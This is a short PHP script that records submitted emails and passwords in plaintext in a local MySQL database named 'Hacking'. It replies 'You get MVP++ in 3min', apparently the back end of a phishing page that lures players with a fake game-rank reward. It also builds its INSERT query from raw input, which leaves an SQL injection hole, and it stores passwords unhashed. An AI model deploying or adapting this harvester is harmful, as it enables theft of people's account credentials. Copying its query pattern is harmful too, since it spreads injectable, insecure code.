<?php
	
	$username = filter_input(INPUT_POST, 'email');
	$password = filter_input(INPUT_POST, 'password');
	if (!empty($username)){
	if (!empty($password)){
		$host = "localhost";
		$dbusername = "root";
		$dbpassword = "";
		$dbname = "Hacking";

		//create connection
		$conn = new mysqli ($host, $dbusername, $dbpassword, $dbname);

		if (mysqli_connect_error()){
			die('Connect Error ('. mysqli_connect_errno() .') '
				. mysqli_connect_error());
		}
		else{
			$sql = "INSERT INTO users (email, password)
			values ('$username', '$password')";
			if ($conn->query($sql)){
				echo "You get MVP++ in 3min";
			}
			else{
				echo "Error ". $sql ."<br>".$conn->error;
			}
			$conn->close();
		}
		}
	}
		else{
			echo "Email should not be empty";
			die();
		}
?>